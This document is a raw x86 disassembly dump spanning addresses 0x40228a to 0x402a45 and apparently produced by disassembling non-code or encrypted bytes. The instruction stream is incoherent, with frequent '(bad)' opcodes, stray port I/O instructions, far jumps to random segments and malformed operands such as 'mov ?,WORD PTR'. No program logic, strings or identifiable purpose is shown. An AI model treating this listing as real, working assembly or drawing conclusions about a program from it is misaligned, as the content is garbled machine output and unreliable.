  40228a:	sub    al,0xdc
  40228c:	cmp    al,0x5d
  40228e:	inc    edi
  40228f:	cdq    
  402290:	js     0x4022ca
  402292:	pop    esp
  402293:	inc    edi
  402294:	ss inc esp
  402296:	cmp    eax,0x89598bef
  40229b:	mov    bl,0x81
  40229d:	rcl    edi,cl
  40229f:	nop
  4022a0:	(bad)  
  4022a1:	in     al,0xfd
  4022a3:	pop    esi
  4022a4:	jnp    0x402292
  4022a6:	sub    eax,0xd7c8f2ba
  4022ab:	sbb    ah,ch
  4022ad:	fld    DWORD PTR ds:0x602c43c9
  4022b3:	fst    st(1)
  4022b5:	lahf   
  4022b6:	sar    BYTE PTR [esp+edx*4-0x63],0x94
  4022bb:	mov    DWORD PTR [edi-0x3],ebx
  4022be:	xchg   esp,eax
  4022bf:	add    ebp,esp
  4022c1:	xlat   BYTE PTR ds:[ebx]
  4022c2:	dec    edx
  4022c3:	ss aaa 
  4022c5:	adc    esi,DWORD PTR [ebx-0x22c016e9]
  4022cb:	repz push ecx
  4022cd:	rcl    dh,0xfc
  4022d0:	retf   0x128b
  4022d3:	int    0x3
  4022d5:	cmp    DWORD PTR [edi+ebx*2],edx
  4022d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d9:	fdivr  QWORD PTR [ebx]
  4022db:	xchg   ebx,eax
  4022dc:	adc    DWORD PTR [edi-0x74],edi
  4022df:	pop    eax
  4022e0:	in     al,0xb8
  4022e2:	add    al,BYTE PTR [ecx+0x1ebe4ea3]
  4022e8:	push   ecx
  4022e9:	(bad)  
  4022ea:	cmp    ebx,DWORD PTR [esi+0x2e5a942e]
  4022f0:	jb     0x402287
  4022f2:	jmp    0x402358
  4022f4:	je     0x402373
  4022f6:	pop    eax
  4022f7:	pop    edi
  4022f8:	(bad)  
  4022f9:	or     eax,0x6a65c65d
  4022fe:	mov    bh,0x84
  402300:	inc    edx
  402301:	inc    ebx
  402302:	add    ebx,eax
  402304:	das    
  402305:	ins    DWORD PTR es:[edi],dx
  402306:	dec    esi
  402307:	xlat   BYTE PTR ds:[ebx]
  402308:	jl     0x4022c3
  40230a:	aad    0x75
  40230c:	pop    edx
  40230d:	popf   
  40230e:	mov    ebp,0xc2f25722
  402313:	(bad)  
  402314:	mov    ebx,0x72117408
  402319:	fcomp  st(6)
  40231b:	mov    edx,0x4732026a
  402320:	fcom   DWORD PTR [edi]
  402322:	icebp  
  402323:	pop    ebx
  402324:	xor    bl,BYTE PTR [edx-0x79cccebb]
  40232a:	sbb    esi,DWORD PTR [eax-0x6]
  40232d:	or     edx,DWORD PTR [ecx-0x30]
  402330:	push   eax
  402331:	test   DWORD PTR [esi-0x26f3604],0x991bebc0
  40233b:	mov    edi,0x6baddc92
  402340:	sbb    ebp,DWORD PTR [esp+esi*1]
  402343:	inc    edx
  402344:	jns    0x4022e4
  402346:	xor    BYTE PTR [edi],0x8c
  402349:	adc    BYTE PTR [ecx],0xd4
  40234c:	or     BYTE PTR [ebp+0x7a],dh
  40234f:	mov    ebp,DWORD PTR [ebp-0x392c3cb]
  402355:	shl    BYTE PTR [ebp-0x1b],1
  402358:	mov    edi,0xe9a9fc7a
  40235d:	cmp    edx,esp
  40235f:	dec    ecx
  402360:	push   edx
  402361:	(bad)  
  402362:	aad    0xb2
  402364:	jmp    0x40236c
  402366:	fsubr  DWORD PTR [edx]
  402368:	and    esp,DWORD PTR [edx+0x4d]
  40236b:	sbb    BYTE PTR [ebx],bl
  40236d:	mov    ds:0x772198be,al
  402372:	out    dx,al
  402373:	shl    DWORD PTR [edi+0x19520cf],0x88
  40237a:	or     eax,0x8d427e41
  40237f:	xchg   esp,eax
  402380:	pusha  
  402381:	mul    DWORD PTR [ebx+0x20]
  402384:	xor    eax,0x621cb041
  402389:	or     esi,DWORD PTR [ecx]
  40238b:	push   ebp
  40238c:	loop   0x402346
  40238e:	das    
  40238f:	fwait
  402390:	cmp    BYTE PTR [edi-0x23],dl
  402393:	cdq    
  402394:	jne    0x40236a
  402396:	push   es
  402397:	repnz inc esi
  402399:	mov    ds:0x3628d069,al
  40239e:	pop    ds
  40239f:	loopne 0x4023bf
  4023a1:	jmp    0x2357:0x194d2180
  4023a8:	cmp    ecx,DWORD PTR [edi]
  4023aa:	rep ins BYTE PTR es:[edi],dx
  4023ac:	in     al,dx
  4023ad:	and    DWORD PTR [ecx],eax
  4023af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023b0:	lahf   
  4023b1:	jmp    0x402359
  4023b3:	pop    eax
  4023b4:	or     cl,BYTE PTR [eax+eax*8+0x2a]
  4023b8:	dec    ebx
  4023b9:	test   eax,0xd0c097d6
  4023be:	mov    ch,0x19
  4023c0:	adc    BYTE PTR [edi],cl
  4023c2:	sbb    eax,0xec954614
  4023c7:	retw   
  4023c9:	ss dec eax
  4023cb:	and    dl,BYTE PTR [eax+0x5607607b]
  4023d1:	dec    ecx
  4023d2:	pop    ebx
  4023d3:	rcr    DWORD PTR [esi-0x2],1
  4023d6:	jmp    esp
  4023d8:	pop    ss
  4023d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023da:	scas   eax,DWORD PTR es:[edi]
  4023db:	and    eax,ebx
  4023dd:	lahf   
  4023de:	stc    
  4023df:	cmp    al,BYTE PTR [ecx+0x29]
  4023e2:	aam    0x60
  4023e4:	ins    BYTE PTR es:[edi],dx
  4023e5:	test   BYTE PTR [eax-0x78],bh
  4023e8:	retf   
  4023e9:	push   eax
  4023ea:	mov    al,ds:0xce77f688
  4023ef:	sbb    al,0x0
  4023f1:	mov    BYTE PTR [ebx+0x6963d2b],dh
  4023f7:	lods   al,BYTE PTR ds:[esi]
  4023f8:	push   edx
  4023f9:	daa    
  4023fa:	outs   dx,DWORD PTR ds:[esi]
  4023fb:	jl     0x4023c2
  4023fd:	stc    
  4023fe:	into   
  4023ff:	mov    eax,0x638a352d
  402404:	sub    al,0x67
  402406:	lea    eax,[esi]
  402408:	push   esp
  402409:	push   ds
  40240a:	in     al,dx
  40240b:	xchg   ecx,eax
  40240c:	into   
  40240d:	sbb    eax,0xe2b81e94
  402412:	(bad)  
  402413:	popf   
  402414:	adc    DWORD PTR [edi-0x49],eax
  402417:	push   ebx
  402418:	jns    0x402434
  40241a:	fiadd  DWORD PTR [eax-0x7c]
  40241d:	out    0x8a,eax
  40241f:	daa    
  402420:	in     al,0xc0
  402422:	lds    esi,FWORD PTR [esi+0x44]
  402425:	clc    
  402426:	in     eax,dx
  402427:	icebp  
  402428:	cmp    eax,0xd6a556f9
  40242d:	jmp    0x4023bc
  40242f:	jle    0x4023e5
  402431:	aas    
  402432:	xchg   esp,eax
  402433:	mov    BYTE PTR [esi+0x6cb8db4c],cl
  402439:	jmp    0xf24a:0xd96bb4fd
  402440:	scas   eax,DWORD PTR es:[edi]
  402441:	xor    bh,BYTE PTR [eax+0xe]
  402444:	dec    esi
  402445:	push   ds
  402446:	push   ss
  402447:	ss xchg esi,eax
  402449:	xor    eax,0x84ce00ea
  40244e:	fstp   QWORD PTR [esi+ebp*1]
  402451:	data16 fidiv DWORD PTR [esi-0x7d]
  402455:	fs jle 0x402423
  402458:	mov    bl,0x42
  40245a:	mov    eax,DWORD PTR [eax+0x7]
  40245d:	mov    edi,0xdf1952f1
  402462:	popa   
  402463:	cmp    eax,DWORD PTR [ebx]
  402465:	shl    BYTE PTR [esi],cl
  402467:	mov    edx,DWORD PTR [esi-0x20d2b7d3]
  40246d:	cmp    dh,al
  40246f:	push   ebx
  402470:	push   es
  402471:	and    ah,BYTE PTR [ecx+0x57]
  402474:	mov    ah,0x13
  402476:	and    esp,DWORD PTR [esi+0x53]
  402479:	fwait
  40247a:	aas    
  40247b:	xchg   edi,eax
  40247c:	add    eax,0x4a1885f8
  402481:	out    dx,eax
  402482:	xchg   ebx,eax
  402483:	aaa    
  402484:	(bad)  
  402485:	adc    edx,esi
  402487:	sbb    DWORD PTR [edi-0x68],0x24
  40248b:	add    ecx,DWORD PTR [ebx+0x6a]
  40248e:	and    bl,al
  402490:	cmp    dh,ah
  402492:	push   ss
  402493:	shl    DWORD PTR [esi+0x22],cl
  402496:	mov    eax,ds:0xd677cd4c
  40249b:	sub    edx,DWORD PTR ss:[edx+ebp*1+0x29]
  4024a0:	sub    eax,0x74e15eca
  4024a5:	into   
  4024a6:	push   edx
  4024a7:	pop    ds
  4024a8:	xor    DWORD PTR gs:[edx+0x79],ecx
  4024ac:	inc    eax
  4024ad:	jecxz  0x4024c1
  4024af:	(bad)  
  4024b0:	mov    ebx,0xc4cb3a39
  4024b5:	or     eax,DWORD PTR ds:0x2f266650
  4024bb:	aam    0x6
  4024bd:	xor    bl,BYTE PTR [ebx+ebp*1+0x1089ef32]
  4024c4:	hlt    
  4024c5:	mov    eax,0x8b6d058e
  4024ca:	loop   0x4024a1
  4024cc:	pop    edi
  4024cd:	jl     0x40250d
  4024cf:	das    
  4024d0:	stos   BYTE PTR es:[edi],al
  4024d1:	int3   
  4024d2:	cmp    ch,BYTE PTR [esi-0x1332a258]
  4024d8:	pop    edx
  4024d9:	xor    eax,DWORD PTR [eax+0x14]
  4024dc:	pop    ds
  4024dd:	sbb    cl,BYTE PTR [ebx-0x1b]
  4024e0:	dec    eax
  4024e1:	inc    BYTE PTR [ebx+0x44dc8e78]
  4024e7:	and    eax,0xf75418dd
  4024ec:	sub    BYTE PTR ds:0x93903413,ah
  4024f2:	sub    esp,DWORD PTR [ecx+0x81828f4]
  4024f8:	cs push ebx
  4024fa:	hlt    
  4024fb:	adc    ebx,DWORD PTR [eax-0x27]
  4024fe:	cwde   
  4024ff:	icebp  
  402500:	sub    eax,0x39039d48
  402505:	sbb    eax,DWORD PTR [ebx+0x3d]
  402508:	sub    al,BYTE PTR [esi+ecx*2]
  40250b:	push   es
  40250c:	sbb    BYTE PTR [edx+0x42],ch
  40250f:	scas   eax,DWORD PTR es:[edi]
  402510:	add    ebp,DWORD PTR [eax]
  402512:	or     eax,0xc979bb30
  402517:	inc    ah
  402519:	lea    edi,[edi]
  40251b:	mov    ecx,0x861578c9
  402520:	mov    edx,0xb0c8911d
  402525:	int3   
  402526:	mov    al,0xcd
  402528:	fld    TBYTE PTR [edx]
  40252a:	push   ebx
  40252b:	(bad)  
  40252c:	jl     0xcf8f34e3
  402532:	lock (bad) 
  402534:	jne    0xea20d0a1
  40253a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40253b:	js     0x40253b
  40253d:	test   ch,al
  40253f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402540:	(bad)  
  402541:	(bad)  
  402542:	mov    eax,ds:0x7b46933e
  402547:	mov    bh,BYTE PTR [ebp+0x498e4580]
  40254d:	in     al,dx
  40254e:	sbb    DWORD PTR [edx],ebp
  402550:	inc    edx
  402551:	sub    DWORD PTR [ebx],edi
  402553:	and    eax,0x11c10b15
  402558:	mov    ch,0x3a
  40255a:	fldln2 
  40255c:	mov    esi,0x2385278d
  402561:	add    al,BYTE PTR [edx+0x1b]
  402564:	mov    cs,WORD PTR [edi-0x4b88df24]
  40256a:	add    dh,cl
  40256c:	jmp    0xa4efce38
  402571:	jp     0x4025ad
  402573:	retf   
  402574:	lahf   
  402575:	test   ah,0x29
  402578:	sub    bl,BYTE PTR cs:[esi]
  40257b:	inc    ebp
  40257c:	into   
  40257d:	pop    es
  40257e:	fwait
  40257f:	pop    es
  402580:	shl    BYTE PTR [ebx],cl
  402582:	push   0x4
  402584:	sub    ebx,eax
  402586:	out    0xd,eax
  402588:	sub    BYTE PTR [ebx],bh
  40258a:	or     al,0x8a
  40258c:	bound  edi,QWORD PTR [esi]
  40258e:	clc    
  40258f:	ins    BYTE PTR es:[edi],dx
  402590:	xor    al,0xbc
  402592:	mov    al,ds:0xf31a00de
  402597:	add    al,0x99
  402599:	sub    cl,BYTE PTR [edx+0x42eacab7]
  40259f:	mul    BYTE PTR [eax]
  4025a1:	nop
  4025a2:	retf   
  4025a3:	sub    BYTE PTR ds:[edi-0x15],0xd9
  4025a8:	test   DWORD PTR [ebx-0x426f7caa],ecx
  4025ae:	or     DWORD PTR [ecx-0x6f9b84d8],eax
  4025b4:	(bad)  
  4025b5:	mov    ebx,0x6906484f
  4025ba:	addr16 dec ecx
  4025bc:	adc    BYTE PTR [edi],0x6
  4025bf:	sbb    DWORD PTR [ebx-0x231cef2],esp
  4025c5:	add    ebx,DWORD PTR [ebx]
  4025c7:	in     al,dx
  4025c8:	sbb    ch,BYTE PTR [ecx]
  4025ca:	dec    ebp
  4025cb:	push   edi
  4025cc:	mov    ch,BYTE PTR [ebx]
  4025ce:	sub    al,0x9c
  4025d0:	sbb    al,0xc4
  4025d2:	mov    edx,0x4c4bccf2
  4025d7:	xchg   edx,eax
  4025d8:	jo     0x4025fc
  4025da:	fstp   DWORD PTR [ecx]
  4025dc:	push   cs
  4025dd:	rol    DWORD PTR ds:0xbc6ba052,1
  4025e3:	loope  0x402601
  4025e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025e6:	jno    0x402593
  4025e8:	mov    dh,0xf1
  4025ea:	add    eax,0xd80d0140
  4025ef:	lahf   
  4025f0:	mov    esi,0xd7b6bd59
  4025f5:	retf   0xe5b
  4025f8:	sbb    al,0x76
  4025fa:	adc    dh,ah
  4025fc:	sbb    eax,0xadbaaa65
  402601:	(bad)  
  402602:	sub    ecx,edi
  402604:	cwde   
  402605:	push   edi
  402606:	mov    eax,0x71226a1f
  40260b:	xchg   ax,ax
  40260d:	mov    ch,0xef
  40260f:	sbb    edx,DWORD PTR [esi-0x43c5bc43]
  402615:	lods   al,BYTE PTR ds:[esi]
  402616:	sahf   
  402617:	fmul   DWORD PTR [ebx-0x6dbad742]
  40261d:	or     ah,0xf7
  402620:	fnsave [ecx]
  402622:	mov    dl,BYTE PTR ds:0xeef2f2ef
  402628:	sub    DWORD PTR [edi+0x179f3d36],eax
  40262e:	rcr    esi,1
  402630:	xchg   bh,cl
  402632:	into   
  402633:	pushf  
  402634:	mov    ebp,DWORD PTR [ecx+0x2e]
  402637:	adc    DWORD PTR [edx],0xffffffdd
  40263a:	out    dx,eax
  40263b:	sub    ebp,DWORD PTR [edx-0x2a]
  40263e:	or     DWORD PTR [edi-0x52d4d77f],ebx
  402644:	out    dx,al
  402645:	fmul   DWORD PTR [ebx-0x13]
  402648:	sub    ch,BYTE PTR [ebx-0x6cce5541]
  40264e:	jl     0x4026ae
  402650:	mov    eax,ds:0x790f70fc
  402655:	and    al,0x1a
  402657:	pop    es
  402658:	enter  0x5c58,0x17
  40265c:	mov    ds:0x4be1b408,eax
  402661:	ret    
  402662:	mov    bl,0xa1
  402664:	xchg   ebp,eax
  402665:	mov    eax,0x60a41fb1
  40266a:	lahf   
  40266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40266c:	cld    
  40266d:	inc    esp
  40266e:	imul   edx,esi,0xffffffac
  402671:	add    DWORD PTR [esi],0xe
  402674:	mov    ch,0x34
  402676:	push   cs
  402677:	idiv   dl
  402679:	gs push ebx
  40267b:	or     ebp,DWORD PTR [edi]
  40267d:	xlat   BYTE PTR ds:[ebx]
  40267e:	aas    
  40267f:	mov    edx,0xbf6270f4
  402684:	mov    esp,0xb42e075f
  402689:	cs inc edx
  40268b:	or     DWORD PTR [ebx-0x1950239c],ebp
  402691:	lahf   
  402692:	test   DWORD PTR [eax-0x10105fdf],esp
  402698:	push   es
  402699:	in     al,dx
  40269a:	mov    ch,0x6
  40269c:	call   0xaa2d:0x62f52d82
  4026a3:	xor    ebp,0xddc5b6ca
  4026a9:	mov    ebx,0x57b1b03c
  4026ae:	and    BYTE PTR [edx],ah
  4026b0:	loopne 0x402725
  4026b2:	push   es
  4026b3:	dec    edx
  4026b4:	and    DWORD PTR [edx],edi
  4026b6:	xchg   ebx,eax
  4026b7:	jge    0x402735
  4026b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ba:	pop    eax
  4026bb:	arpl   bx,si
  4026bd:	ret    0xa5cb
  4026c0:	cmp    DWORD PTR es:[bp+di+0x3cde],ebp
  4026c6:	inc    ecx
  4026c7:	mov    al,0xdf
  4026c9:	mov    ch,0x78
  4026cb:	cmp    DWORD PTR [edx-0x55],ecx
  4026ce:	add    eax,0xd5f2aecb
  4026d3:	popf   
  4026d4:	pop    ebx
  4026d5:	or     al,0x18
  4026d7:	inc    ecx
  4026d8:	fninit 
  4026da:	(bad)  
  4026db:	dec    esp
  4026dc:	push   ebp
  4026dd:	clc    
  4026de:	fstp   QWORD PTR [ebp+0x19b976ce]
  4026e4:	pop    esi
  4026e5:	popa   
  4026e6:	jnp    0x4026dd
  4026e8:	out    dx,eax
  4026e9:	int3   
  4026ea:	mov    dh,0x4
  4026ec:	outs   dx,DWORD PTR ds:[esi]
  4026ed:	in     al,dx
  4026ee:	test   eax,0xb5eb9c86
  4026f3:	sahf   
  4026f4:	fwait
  4026f5:	scas   al,BYTE PTR es:[edi]
  4026f6:	pop    ebx
  4026f7:	pop    esp
  4026f8:	xchg   esi,eax
  4026f9:	(bad)  
  4026fa:	clc    
  4026fb:	inc    ecx
  4026fc:	test   al,0x5d
  4026fe:	clc    
  4026ff:	ficom  DWORD PTR [edi+0xef5facd]
  402705:	mov    WORD PTR [ebp-0x4],?
  402708:	mov    ecx,0x281f22a
  40270d:	xchg   esi,eax
  40270e:	iret   
  40270f:	ins    BYTE PTR es:[edi],dx
  402710:	jb     0x40276b
  402712:	hlt    
  402713:	add    eax,0x50b28b9
  402718:	jecxz  0x4026a4
  40271a:	sbb    edx,DWORD PTR [eax+0x11]
  40271d:	(bad)  
  40271e:	mov    al,0xf
  402720:	jl     0x402742
  402722:	or     bh,BYTE PTR [esi-0x65e88bb0]
  402728:	repz cdq 
  40272a:	lods   eax,DWORD PTR ds:[esi]
  40272b:	sbb    eax,0x5692d22
  402730:	ins    DWORD PTR es:[edi],dx
  402731:	lahf   
  402732:	xor    edx,DWORD PTR [edi-0x7319975a]
  402738:	adc    DWORD PTR [esi+0x4c9fe696],esi
  40273e:	adc    al,0x37
  402740:	dec    esp
  402741:	vpsubusb ymm6,ymm5,YMMWORD PTR [edx]
  402745:	call   0x7bcf9082
  40274a:	sub    dl,BYTE PTR [ebx]
  40274c:	ds xchg esi,eax
  40274e:	je     0x4026e1
  402750:	xor    BYTE PTR [ecx],cl
  402752:	les    edx,FWORD PTR [edx+eax*1]
  402755:	dec    esp
  402756:	jb     0x402799
  402758:	sub    ebx,DWORD PTR [eax+edi*2]
  40275b:	sbb    BYTE PTR [ecx],ch
  40275d:	push   ss
  40275e:	int    0x2e
  402760:	in     al,0xdd
  402762:	or     al,0xb0
  402764:	adc    edi,edx
  402766:	jbe    0x402780
  402768:	loopne 0x402721
  40276a:	jnp    0x402728
  40276c:	inc    edi
  40276d:	iret   
  40276e:	adc    eax,0xb8c1f55b
  402773:	mov    esi,0xcc81bad4
  402778:	push   ss
  402779:	sar    DWORD PTR [edx],0x8d
  40277c:	mov    bl,0x7b
  40277e:	xchg   BYTE PTR [edi-0x9],bh
  402781:	mov    ch,0x88
  402783:	ror    dl,1
  402785:	sub    esi,DWORD PTR [edi+0x23e84db4]
  40278b:	push   ss
  40278c:	out    0xe1,eax
  40278e:	jecxz  0x402716
  402790:	jecxz  0x402793
  402792:	add    ecx,DWORD PTR [esi+esi*2+0x12]
  402796:	(bad)  
  402797:	fcmovnu st,st(4)
  402799:	rcl    DWORD PTR [edi-0x79d2aa3e],0xaf
  4027a0:	(bad)
  4027a3:	cmp    al,0x81
  4027a5:	imul   ecx,DWORD PTR [ecx+0x6544c45],0x31338fd2
  4027af:	mov    eax,ds:0xcff13f5c
  4027b4:	int3   
  4027b5:	jb     0x4027b2
  4027b7:	and    BYTE PTR [esi-0x50],al
  4027ba:	inc    ebp
  4027bb:	inc    edi
  4027bc:	gs mov ah,0x44
  4027bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c0:	adc    al,0x5f
  4027c2:	and    DWORD PTR [ebp+0x30],ebp
  4027c5:	(bad)  
  4027c6:	push   ecx
  4027c7:	out    0x5a,al
  4027c9:	push   es
  4027ca:	rol    BYTE PTR [ebx-0x74],1
  4027cd:	push   0xa05fc85b
  4027d2:	pop    ebx
  4027d3:	ror    dh,cl
  4027d5:	mov    ebx,DWORD PTR [ebp-0x5ac2b184]
  4027db:	pop    edx
  4027dc:	or     BYTE PTR [eax-0x5bddf66e],0xae
  4027e3:	add    dl,BYTE PTR [eax+0x68]
  4027e6:	gs retf 
  4027e8:	mov    ch,0xf3
  4027ea:	test   DWORD PTR [ecx+0x3c],ebp
  4027ed:	inc    eax
  4027ee:	mov    eax,0xa338d7ad
  4027f3:	sub    BYTE PTR [ecx-0x2],ah
  4027f6:	(bad)  
  4027f7:	int3   
  4027f8:	dec    esp
  4027f9:	int3   
  4027fa:	aam    0xd0
  4027fc:	push   eax
  4027fd:	das    
  4027fe:	mov    ebp,0xffeb7ac2
  402803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402804:	jno    0x402827
  402806:	loopne 0x402799
  402808:	dec    edi
  402809:	pop    edx
  40280a:	mov    eax,ds:0xdf0f707e
  40280f:	les    ecx,FWORD PTR [esp+eax*2+0x36]
  402813:	es mov dl,0x77
  402816:	pop    esp
  402817:	div    bh
  402819:	jnp    0x40279f
  40281b:	inc    esi
  40281c:	mov    cl,0x65
  40281e:	or     edi,esi
  402820:	sahf   
  402821:	dec    esi
  402822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402823:	cmp    BYTE PTR cs:[ebx-0x1fc50dbc],bh
  40282a:	inc    BYTE PTR [eax-0x38]
  40282d:	add    eax,0xda9ec361
  402832:	lock sbb DWORD PTR [ecx-0x24361132],ebp
  402839:	xchg   DWORD PTR [edi+eax*2+0x57e44f4d],esp
  402840:	fcmovnu st,st(7)
  402842:	mov    edx,DWORD PTR [eax]
  402844:	(bad)  
  402845:	pop    edi
  402846:	inc    eax
  402847:	out    0x99,al
  402849:	push   0xffffffe5
  40284b:	cs mov dl,0xa1
  40284e:	(bad)  
  40284f:	into   
  402850:	cmp    dh,BYTE PTR [esi]
  402852:	mov    dh,0xd
  402854:	jg     0x40281e
  402856:	das    
  402857:	dec    esp
  402858:	rcr    BYTE PTR [eax-0x48d9bd58],cl
  40285e:	and    ah,BYTE PTR [ecx]
  402860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402861:	mov    eax,0xbc1786fe
  402866:	xor    DWORD PTR [edi-0x7b2fbf53],0xfd445e2e
  402870:	test   BYTE PTR [esi],ah
  402872:	mov    al,ds:0xc20bfee8
  402877:	dec    esp
  402878:	je     0x4028b1
  40287a:	xchg   edi,eax
  40287b:	out    0xe,al
  40287d:	or     al,BYTE PTR [ecx+0x1ac493cf]
  402883:	pusha  
  402884:	stos   BYTE PTR es:[edi],al
  402885:	mov    al,ds:0xbd795881
  40288a:	xchg   DWORD PTR [ecx+0x45],esi
  40288d:	jne    0x4028ed
  40288f:	or     cl,BYTE PTR [ecx-0x618c8942]
  402895:	adc    ch,BYTE PTR [edx+edx*4+0x19e9dfa2]
  40289c:	sbb    DWORD PTR [ebx-0x7152396],edi
  4028a2:	lahf   
  4028a3:	shl    BYTE PTR [eax],0x53
  4028a6:	xchg   edx,eax
  4028a7:	and    BYTE PTR [edx],0x40
  4028aa:	push   ebp
  4028ab:	cmp    dl,BYTE PTR [esi-0x50cd4251]
  4028b1:	mov    DWORD PTR [ecx-0x48e0ce81],ebx
  4028b7:	add    esi,esp
  4028b9:	xchg   ebp,eax
  4028ba:	int    0x34
  4028bc:	repz repz cmp BYTE PTR [ebp+ecx*1-0x579c5df4],dh
  4028c5:	pop    ds
  4028c6:	ret    
  4028c7:	push   ecx
  4028c8:	dec    edx
  4028c9:	imul   ebx,DWORD PTR [ecx],0xffffffe7
  4028cc:	push   eax
  4028cd:	jmp    0x17b4:0xff4eae24
  4028d4:	cmp    BYTE PTR ds:0x50184314,cl
  4028da:	pop    es
  4028db:	add    ebx,0x6f
  4028de:	je     0x40292f
  4028e0:	mov    ch,0xc8
  4028e2:	mov    cs,WORD PTR [ebx+0x3e]
  4028e5:	and    ah,0x19
  4028e8:	mov    esp,0x34dc06e1
  4028ed:	cdq    
  4028ee:	adc    DWORD PTR [ebx-0x5c],eax
  4028f1:	aaa    
  4028f2:	push   edi
  4028f3:	rol    DWORD PTR ss:[ecx+edi*2-0x21],cl
  4028f8:	and    eax,0xb5dd32ae
  4028fd:	sub    eax,0x2a2cb07
  402902:	push   esp
  402903:	into   
  402904:	cmp    eax,0x3a22dc5a
  402909:	sbb    eax,0x2e60d9bb
  40290e:	sub    ch,ch
  402910:	cmp    dh,BYTE PTR [edi-0x80]
  402913:	int3   
  402914:	mov    al,dl
  402916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402917:	sbb    DWORD PTR [ecx-0x1dfe7b19],esi
  40291d:	scas   eax,DWORD PTR es:[edi]
  40291e:	add    ebp,DWORD PTR [ebx-0x13]
  402921:	jp     0x402943
  402923:	imul   esp,ecx,0xffffff83
  402926:	jns    0x4028e5
  402928:	push   0x1807a61f
  40292d:	push   esp
  40292e:	repnz into 
  402930:	neg    edx
  402932:	loope  0x4028ea
  402934:	lods   eax,DWORD PTR ds:[esi]
  402935:	mov    ah,0xa2
  402937:	jo     0x402962
  402939:	mov    bh,0x91
  40293b:	cmc    
  40293c:	xor    cl,BYTE PTR [ebx]
  40293e:	jno    0x40294f
  402940:	repz pusha 
  402942:	mov    ebx,0xfe64f559
  402947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402948:	mov    dh,0xff
  40294a:	icebp  
  40294b:	adc    BYTE PTR [edx-0x55],bh
  40294e:	and    BYTE PTR [ecx-0x71951142],dh
  402954:	je     0x402924
  402956:	cmp    BYTE PTR [esp+ebx*1+0x430b4315],cl
  40295d:	mov    fs,WORD PTR [edx+0x7a2d18c3]
  402963:	dec    esp
  402964:	xchg   ecx,eax
  402965:	push   ecx
  402966:	fwait
  402967:	push   esp
  402968:	or     al,0x7
  40296a:	in     eax,0xb1
  40296c:	mov    WORD PTR [ebx],es
  40296e:	cdq    
  40296f:	out    dx,al
  402970:	mov    eax,0xff09c286
  402975:	js     0x40298f
  402977:	mov    WORD PTR [ebx],gs
  402979:	mov    ds:0x292f8f9c,al
  40297e:	outs   dx,DWORD PTR ds:[esi]
  40297f:	neg    ebp
  402981:	push   ds
  402982:	cmp    DWORD PTR [eax-0x54],eax
  402985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402986:	fs ja  0x402953
  402989:	push   ebx
  40298a:	out    dx,al
  40298b:	pop    ds
  40298c:	dec    esp
  40298d:	pop    esi
  40298e:	fcomp  DWORD PTR [ecx]
  402990:	clc    
  402991:	jecxz  0x4029a4
  402993:	sub    eax,0x7562c371
  402998:	mov    cl,0x7
  40299a:	cmp    edi,DWORD PTR [ebx+0x303d2d78]
  4029a0:	js     0x40299a
  4029a2:	into   
  4029a3:	inc    ecx
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	sbb    DWORD PTR es:[edi+0x59],ecx
  4029a9:	or     ebx,edx
  4029ab:	dec    edi
  4029ac:	add    ebx,ecx
  4029ae:	adc    al,0x9e
  4029b0:	cmp    dl,BYTE PTR [edi]
  4029b2:	mov    DWORD PTR [esi+0x3e4818da],ebx
  4029b8:	(bad)
  4029bb:	test   BYTE PTR [esp+edx*4+0x4fbc539c],bh
  4029c2:	and    al,BYTE PTR [edi-0x25ff7a30]
  4029c8:	jnp    0x402a40
  4029ca:	in     al,dx
  4029cb:	dec    edi
  4029cc:	lds    edx,FWORD PTR ds:0x642e7854
  4029d2:	fimul  WORD PTR [edi+0x5b9b9f0e]
  4029d8:	(bad)  
  4029d9:	cdq    
  4029da:	add    edx,DWORD PTR [ecx+0x5e]
  4029dd:	mov    ebp,DWORD PTR [ebx]
  4029df:	or     ecx,DWORD PTR [ebp-0x69fd9b84]
  4029e5:	cmp    al,0x26
  4029e7:	popf   
  4029e8:	pop    ebp
  4029e9:	push   edx
  4029ea:	mov    ?,WORD PTR [ebx+0x1fd5bd8b]
  4029f0:	adc    al,0x6f
  4029f2:	and    eax,0xdda55780
  4029f7:	(bad)  
  4029f8:	xchg   ebp,eax
  4029f9:	aad    0x78
  4029fb:	xchg   ebp,eax
  4029fc:	or     ecx,eax
  4029fe:	bound  ebp,QWORD PTR [esp+ecx*1+0x51404b3f]
  402a05:	lods   eax,DWORD PTR ds:[esi]
  402a06:	mov    al,0xcb
  402a08:	push   ebp
  402a09:	std    
  402a0a:	push   0xffffffc2
  402a0c:	shl    DWORD PTR [edx-0x49],0x9a
  402a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a11:	mov    ecx,0x7d61fa19
  402a16:	mov    DWORD PTR [edx+0x1f254156],ebp
  402a1c:	(bad)  
  402a1d:	retf   
  402a1e:	imul   ecx,eax,0xffffffc2
  402a21:	rcr    BYTE PTR ds:0x8c8c829b,1
  402a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a28:	xor    edi,DWORD PTR [edx-0x6f]
  402a2b:	push   ecx
  402a2c:	pop    eax
  402a2d:	or     DWORD PTR [edx-0x53],ecx
  402a30:	es hlt 
  402a32:	mov    dl,0xb5
  402a34:	(bad)  [edi-0x26]
  402a37:	mov    bh,BYTE PTR [esp+ebx*1]
  402a3a:	mov    cl,0x4e
  402a3c:	xchg   edx,eax
  402a3d:	les    ecx,FWORD PTR [edx-0x69874123]
  402a43:	je     0x4029d7
  402a45:	dec    ebx
